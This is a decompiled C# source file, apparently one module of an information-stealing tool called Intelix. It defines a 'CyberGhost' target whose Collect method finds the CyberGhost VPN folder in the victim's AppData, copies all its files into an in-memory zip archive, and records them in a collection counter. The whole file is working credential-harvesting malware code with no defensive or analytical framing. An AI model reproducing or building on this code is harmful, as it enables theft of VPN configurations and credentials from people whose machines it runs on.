using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn
{
	// Token: 0x02000008 RID: 8
	public class CyberGhost : ITarget
	{
		// Token: 0x06000022 RID: 34 RVA: 0x000028FC File Offset: 0x00000AFC
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "CyberGhost");
			bool flag = Directory.Exists(text);
			if (flag)
			{
				string text2 = "CyberGhost";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "CyberGhost";
				zip.AddDirectoryFiles(text, text2, true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
